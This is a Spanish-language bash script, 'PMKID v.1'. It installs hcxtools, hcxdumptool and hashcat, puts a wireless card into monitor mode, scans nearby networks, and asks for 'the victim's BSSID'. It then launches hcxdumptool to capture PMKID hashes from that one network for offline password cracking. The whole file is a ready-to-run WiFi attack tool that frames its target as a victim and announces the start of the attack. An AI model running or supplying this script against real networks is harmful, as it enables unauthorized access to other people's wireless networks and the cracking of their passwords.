#!/bin/bash
#PMKID v.1
#creado por mrvalem

dependencia(){
printf "[*] Instalando requerimientos del sistema....!\n"
sleep 03
sudo apt-get update
sleep 02
sudo apt-get dist-upgrade -y
sleep 02
sudo apt-get install libssl-dev
sleep 02
sudo apt-get install libz-dev
sleep 02
sudo apt-get install libpcap-dev
sleep 02
sudo apt-get install libcurl4-openssl-dev
sleep 1
sudo apt-get install opencl-headers
sleep 1
printf "[*] Se termino de Instalar los requerimientos!\n"
}
Inicio(){
read -p 'Precion 1 para instalar los requerimientos | si ya instalo precione 2: ' num
if [[ $num == 01 || $num == 1 ]]; then
    sleep 01
    dependencia 
    printf "[*] Clonado los script hctools, hxcdumptool y hashcat...\n"  
    read -p 'Introducir el directorio para la descarga!: ' direc
    cd $direc
    hcxtool
    hxdumptool
    Hashcat
    printf "[*] Descarga completa!\n"
    printf "\n"
    sleep 1
    printf "\e[101m\e[1;77m[*] Activando hcxtools...\e[0m\n"
    cd $direc/hcxtools
    make
    printf "\n"
    printf "\e[101m\e[1;77m[*] Activando hcxdumptool...\e[0m\n"
    cd $direc/hcxdumptool
    make
    printf "\n"
    printf "\e[101m\e[1;77m[*] Activando hashcat...\e[0m\n"  
    cd $direc/hashcat
    make
    clear
    sleep 02
    printf "[*] Se Instalaron todos lo requerimientos!\n"
    echo "Vuelve a ejecutar el script!"
else 
banner
menu
fi
}
hcxtool(){
git clone https://github.com/ZerBea/hcxtools
}
hxdumptool(){
git clone https://github.com/ZerBea/hcxdumptool
}
Hashcat(){
git clone https://github.com/hashcat/hashcat
}
banner(){

printf "        \e[1;77m  _____  __  __ _  _______ _____   \e[0m\n"
printf "        \e[1;77m |  __ \|  \/  | |/ /_   _|  __ \  \e[0m\n"
printf "        \e[1;77m | |__) | \  / | ' /  | | | |  | | \e[0m\n"
printf "        \e[1;77m |  ___/| |\/| |  <   | | | |  | | \e[0m\n"
printf "        \e[1;77m | |    | |  | | . \ _| |_| |__| | \e[0m\n"
printf "        \e[1;77m |_|    |_|  |_|_|\_\_____|_____/   v.1 \e[0m\n"
printf "\n"
printf "         \e[101m\e[1;77m.:.:. PMKID creado por: Mrvalem .:.:.\e[0m\n"
printf "               \e[101m\e[1;77mCorreo: mylovepre16@gmail.com\e[0m\n"
printf "\n" 

}
menu(){
printf "\e[1;92m[\e[0m\e[0;31m01\e[0;31m\e[0m\e[1;92m] \e[0;30mBuscar redes WIFI\e[0;30m\n"
printf "\e[1;92m[\e[0m\e[0;31m02\e[0;31m\e[0m\e[1;92m] \e[0;30mIniciar el Script\e[0;30m\n"
printf "\e[1;92m[\e[0m\e[0;31m03\e[0;31m\e[0m\e[1;92m] \e[0;30mSalir\e[0;30m\n"
printf "\e[0;94m\e[1;77m\n"
read -p '[*] Escoja una opción: ' num

if [[ $num == 01 || $num == 1 ]]; then
    printf "\e[1;92m[\e[0m*\e[1;92m] Trabajando ...\n"
    printf "\n"
    sleep 02
    sudo airmon-ng start wlan0
    clear
    sleep 01
    
    sudo airodump-ng wlan0mon 
    echo "No olvide apuntar el BSSID de la victima sin los dos puntos(:)"
    echo "Ejem: B0:4E:26:05:41:40 a B04E26054140"
    echo "Porfavor vuelva a ejecutar la opcion 2 del script!"
    
elif [[ $num == 02 || $num == 2 ]]; then
    printf "\e[1;92m[\e[0m*\e[1;92m] Trabajando ...\n"
    printf "\n"
    sleep 02
    read -p 'introdusca el directorio de hcxdumptool: ' direc
    sleep 1
    read -p 'introdusca el BSSID de la victima: ' bssid
    cd $direc
    echo "$bssid" > mac.txt
    clear
    sleep 2
    printf "\e[101m\e[1;77mComenzando el Ataque!\e[0m\n"
    cd $direc
    sudo ./hcxdumptool -o hash -i wlan0mon --filterlist=mac.txt --filtermode=2 --enable_status=3

elif [[ $num == 03 || $num == 3 ]]; then
    exit
        
else 
printf "\e[1;93m[!] Opcion Invalida!\e[0m\n"
sleep 01
clear
banner
menu
fi
}
Inicio
